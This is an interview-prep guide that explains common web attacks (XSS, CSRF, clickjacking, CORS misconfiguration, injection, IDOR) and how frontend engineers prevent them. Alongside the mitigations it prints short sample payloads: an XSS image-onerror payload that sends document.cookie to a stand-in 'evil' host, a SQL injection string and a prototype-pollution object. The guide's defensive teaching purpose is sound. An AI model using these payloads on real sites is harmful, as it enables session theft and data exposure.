# Cyberattacks for Frontend Engineers — Interview Ready Guide

Web / app attacks you must **name, explain, and prevent** in frontend interviews.

Deep auth/storage detail → [10_FRONTEND_AUTH_SECURITY.md](./10_FRONTEND_AUTH_SECURITY.md)  
CORS specifics → [09_CORS.md](./09_CORS.md)

---

## 1. The interview question

> What cyberattacks should a frontend engineer know? How do you prevent them?

They want a **structured list** (not fear-mongering): attack → how it works → FE/BE prevention → one tradeoff.

---

## 2. One-liner

> Most browser attacks abuse either **running attacker code as your site (XSS)**, **tricking the browser into sending the user’s cookies (CSRF)**, or **weak transport / bad config (MITM, CORS, clickjacking)**. I prevent with safe rendering + CSP, cookie flags + CSRF tokens, HTTPS, and **never trusting the UI for authorization**.

---

## 3. Attack map (memorize this table)

| # | Attack | One-line idea | FE cares? |
|---|---|---|---|
| 1 | **XSS** | Inject JS into your page | Critical |
| 2 | **CSRF** | Foreign site triggers your API with user’s cookies | Critical if cookie auth |
| 3 | **Clickjacking** | Invisible iframe tricks clicks | Yes |
| 4 | **MITM** | Attacker sniffs/modifies traffic | Yes (HTTPS) |
| 5 | **Open redirect** | Login/OAuth redirects to evil.com | Yes |
| 6 | **CORS misconfig** | Browser allows evil origin to read API | Yes |
| 7 | **Sensitive data in storage/URL** | Tokens in `localStorage` / query string | Yes |
| 8 | **Prototype pollution** | Attacker mutates `Object.prototype` | Sometimes (JS apps) |
| 9 | **Supply-chain / XSS via deps** | Malicious npm / third-party script | Yes |
| 10 | **SQL / NoSQL injection** | Untrusted input becomes query | Mostly BE — know it |
| 11 | **SSRF / IDOR / broken authZ** | API trusts client too much | Know for system design |
| 12 | **Brute force / credential stuffing** | Guess or reuse passwords | Login UX + BE rate limit |

---

## 4. XSS — Cross-Site Scripting (highest weight)

### What it is

Attacker gets **their JavaScript to run on your origin** (as if it were your app).

```text
User profile “name” = <script>steal(localStorage.token)</script>
Page renders name as HTML → script runs → token stolen
```

### Types (say if asked)

| Type | How |
|---|---|
| **Stored** | Saved in DB (comment, name) → every viewer hit |
| **Reflected** | In URL/query echoed into page once |
| **DOM-based** | FE reads `location` / `innerHTML` unsafely client-side |

### Impact

- Steal tokens from `localStorage`  
- Act as the user (call APIs)  
- Deface UI / phishing overlays  
- Keylog forms  

### Prevent

1. **Never** put untrusted strings into HTML as markup  
2. Prefer text binding (`{{ }}` / `[textContent]`) over `innerHTML`  
3. Angular: default escaping helps; avoid casual `bypassSecurityTrustHtml`  
4. Sanitize if rich HTML is required (allow-list sanitizer)  
5. **CSP** — Content-Security-Policy limits script sources  
6. Prefer **HttpOnly** cookies so XSS can’t *read* session/refresh  
7. Encode output in the right context (HTML / attr / URL / JS)

**Spoken (20s):**

> XSS means attacker JS runs as my site. I treat all user content as untrusted, avoid `innerHTML`, use framework escaping + CSP, and keep long-lived secrets in HttpOnly cookies so they can’t be exfiltrated easily.

---

## 5. CSRF — Cross-Site Request Forgery

### What it is

User is logged into `bank.com`. They visit `evil.com`. Evil page triggers a request to `bank.com`; **browser auto-attaches cookies**.

```text
evil.com → <form action="https://bank.com/transfer" method="POST">
Browser sends bank.com session cookie → money moves
```

### When it matters

- Cookie-based auth / session → **high risk**  
- Bearer token only in `Authorization` header set by your JS → classic form CSRF is **weaker**

### Prevent

1. `SameSite=Lax` or `Strict` on auth cookies  
2. Anti-CSRF token (header must match server/session)  
3. Check `Origin` / `Referer` on state-changing requests  
4. Prefer POST + JSON APIs (not simple HTML form endpoints) for mutations  
5. Re-auth for sensitive actions (password, payout)

**Spoken (20s):**

> CSRF abuses automatic cookie sending. I use SameSite cookies, CSRF tokens on mutating requests, and Origin checks. If we use Bearer-from-JS, classic CSRF is weaker, but then XSS becomes the bigger token-theft risk.

---

## 6. Clickjacking

### What it is

Your app is embedded in a transparent iframe on an evil page. User thinks they’re clicking “Play” but actually clicks “Delete account” on your site.

### Prevent

1. `Content-Security-Policy: frame-ancestors 'self'` (modern)  
2. Legacy: `X-Frame-Options: DENY` or `SAMEORIGIN`  
3. For needed embeds: allow-list specific parents only  

**Spoken:**

> Clickjacking is UI redress via iframe. I block framing with `frame-ancestors` / `X-Frame-Options` unless embedding is an explicit product requirement.

---

## 7. MITM — Man-in-the-Middle

### What it is

On insecure networks, attacker intercepts HTTP and reads/modifies tokens, cookies, HTML.

### Prevent

1. **HTTPS everywhere**  
2. Cookie flag `Secure`  
3. **HSTS** (`Strict-Transport-Security`)  
4. No mixed content (HTTPS page loading HTTP scripts)  
5. `wss://` for WebSockets  

---

## 8. Open redirect

### What it is

```text
https://app.com/login?next=https://evil.com/phish
After login → redirect to evil.com (looks like it came from you)
```

Used in phishing / OAuth token theft flows.

### Prevent

1. Allow-list redirect URLs (relative paths only, or known hosts)  
2. Never blindly redirect to `?returnUrl=` from query  
3. OAuth: strict redirect URI registration + PKCE for public clients  

---

## 9. CORS misconfiguration

CORS is **browser-enforced**. Misconfig on server can let `evil.com` read authenticated responses.

Bad patterns:

- `Access-Control-Allow-Origin: *` **with** credentials  
- Reflecting any `Origin` without allow-list  
- Exposing sensitive APIs to wildcard origins  

### Prevent

1. Explicit origin allow-list  
2. If cookies/credentials: specific origin + `Allow-Credentials: true` (never `*`)  
3. Don’t treat CORS as auth — still require session/token  

Details: [09_CORS.md](./09_CORS.md)

---

## 10. Insecure token / secret handling (FE classic)

| Mistake | Why bad | Fix |
|---|---|---|
| JWT in `localStorage` | XSS steals | HttpOnly refresh / session; short access in memory |
| Token in URL `?token=` | Logs, history, Referer leak | Code exchange / header / cookie |
| Secrets in frontend bundle | Anyone can download | Secrets only on server |
| Logging tokens | Leak in log drains | Redact |

Full guide: [10_FRONTEND_AUTH_SECURITY.md](./10_FRONTEND_AUTH_SECURITY.md)

---

## 11. Prototype pollution (JS-specific follow-up)

### What it is

```js
// attacker controls JSON merge keys
{ "__proto__": { "isAdmin": true } }
// careless merge → Object.prototype.isAdmin === true
```

Can break auth checks / logic if code trusts polluted prototypes.

### Prevent

1. Don’t merge untrusted objects into `{}` with unsafe deep merge  
2. Prefer `Object.create(null)` / `Map` for dictionaries  
3. Freeze / validate keys; reject `__proto__`, `constructor`, `prototype`  
4. Keep libraries updated  

---

## 12. Supply chain & third-party scripts

### What it is

Malicious or compromised npm package / analytics script runs with your origin’s power.

### Prevent

1. Lockfiles + audit (`npm audit`) + dependabot  
2. Minimize third-party scripts  
3. **CSP** + Subresource Integrity (`integrity=` on CDN scripts)  
4. Review permissions of browser extensions in enterprise (awareness)  

---

## 13. Backend attacks FE should still “know”

You may not fix these in Angular, but interviewers expect awareness.

### SQL / NoSQL injection

```text
Input: ' OR 1=1 --
Becomes part of query → dumps data
```

**Prevent (BE):** parameterized queries / ORM bind params — never string-concatenate user input into SQL. FE: validate format for UX, **never** rely on FE validation for security.

### Broken access control / IDOR

```text
GET /api/orders/123 → returns someone else’s order
because API only checked “logged in”, not “owns 123”
```

**Prevent:** server-side authZ every request. FE hiding buttons is not security.

### Brute force / credential stuffing

**Prevent:** rate limit, lockout/backoff, MFA, CAPTCHA after N fails, breach-password checks. FE: clear errors without revealing “user exists” more than product allows.

---

## 14. Headers cheat sheet (say 4–5)

| Header | Helps against |
|---|---|
| `Content-Security-Policy` | XSS, unwanted scripts |
| `Strict-Transport-Security` | MITM / HTTPS downgrade |
| `X-Frame-Options` / `frame-ancestors` | Clickjacking |
| `X-Content-Type-Options: nosniff` | MIME sniffing tricks |
| `Referrer-Policy` | Token/URL leakage via Referer |
| Cookie: `HttpOnly; Secure; SameSite` | XSS theft / CSRF / MITM |

---

## 15. How to answer in interview (structure)

When they say “tell me about web security”:

```text
1. Bucket attacks: injection-in-page (XSS) | cookie abuse (CSRF) | transport (MITM)
                 | UI trick (clickjacking) | config (CORS) | auth mistakes
2. Pick top 3 deep: XSS, CSRF, token storage
3. Prevention layered: FE safe render + CSP + cookie flags + API authZ + HTTPS
4. Close: “Security is defense in depth; FE guard ≠ backend authZ”
```

---

## 16. Dry-run mini scenarios

### Scenario A — Comment box XSS

```text
Attacker posts: <img src=x onerror=fetch('https://evil/?c='+document.cookie)>
If rendered raw → script-ish handler runs
Fix: text binding / sanitize; HttpOnly so document.cookie lacks session
```

### Scenario B — Cookie CSRF

```text
User logged into app (session cookie)
Visits evil page with auto-submit form to /api/delete-account
Fix: SameSite + CSRF token; require custom header
```

### Scenario C — “Admin hidden” only

```text
FE hides Admin link for role=user
Attacker calls DELETE /api/admin/users/1 with stolen/low token
Fix: API checks role; FE hide is UX only
```

---

## 17. Common interview Q&A

**Q: XSS vs CSRF in one line?**  
A: XSS runs attacker code *on your site*. CSRF makes the *browser* call your site using the user’s cookies without running on your origin.

**Q: Does Angular prevent XSS automatically?**  
A: Template binding escapes by default — big help. DOM APIs, `innerHTML`, and `bypassSecurityTrust*` can still open holes. CSP still recommended.

**Q: Is HTTPS enough?**  
A: Necessary, not sufficient. Stops many MITM cases; doesn’t stop XSS/CSRF/IDOR.

**Q: What’s the #1 FE mistake you see?**  
A: Putting long-lived tokens in `localStorage` and trusting route guards as security.

**Q: How do you prioritize fixes?**  
A: Anything that steals sessions or allows account takeover first (XSS + token storage, authZ bugs), then CSRF on cookie apps, then clickjacking/headers hardening.

**Q: OWASP Top 10 — do I memorize all?**  
A: Know themes: injection, broken authZ, XSS, security misconfig, vulnerable components. Map them to FE actions above.

---

## 18. Spoken answers

**30s — overview**

> For frontend I’d focus on XSS, CSRF, clickjacking, MITM, and insecure token storage. XSS is prevented with safe rendering and CSP; CSRF with SameSite and CSRF tokens when we use cookies; MITM with HTTPS and Secure cookies. Long-lived secrets shouldn’t live in localStorage, and APIs must enforce authorization — not just the UI.

**60s — deeper**

> XSS lets attacker JS run as our origin and steal anything JS can read, so I avoid unsafe HTML, use CSP, and prefer HttpOnly session/refresh cookies. CSRF is the flip side of cookies auto-sending — SameSite plus anti-CSRF tokens on state changes. I’d also set frame-ancestors against clickjacking, lock down CORS origins if we use credentials, never put tokens in URLs, and treat FE validation and route guards as UX only. Defense in depth: transport, browser, app code, and API checks together.

---

## 19. What to write on the whiteboard first

```text
Attacks          Prevent
───────          ───────
XSS         →    escape/sanitize, CSP, HttpOnly
CSRF        →    SameSite, CSRF token, Origin check
MITM        →    HTTPS, Secure, HSTS
Clickjack   →    frame-ancestors / X-Frame-Options
Token leak  →    no localStorage secrets, no URL tokens
AuthZ fail  →    API checks every request
```

---

## 20. Practice checklist

- [ ] Define XSS vs CSRF without pausing  
- [ ] List 3 XSS mitigations + 3 CSRF mitigations  
- [ ] Explain HttpOnly / Secure / SameSite  
- [ ] Name clickjacking header  
- [ ] Explain why FE guard ≠ security  
- [ ] Walk Scenario A/B/C aloud  
- [ ] 60s spoken answer once  

---

## 21. Cheat card

```text
XSS        → attacker JS on your page     → escape + CSP + HttpOnly
CSRF       → foreign site + your cookies  → SameSite + CSRF token
Clickjack  → invisible iframe             → frame-ancestors
MITM       → sniff HTTP                   → HTTPS + HSTS + Secure
CORS fail  → evil origin reads API        → allow-list + no * with creds
Token mess → localStorage / URL           → memory + HttpOnly refresh
IDOR       → “logged in” ≠ “allowed”      → API authZ always
Deps       → malicious script/package     → CSP + SRI + audit

Defense in depth > any single control
FE guard ≠ security
```
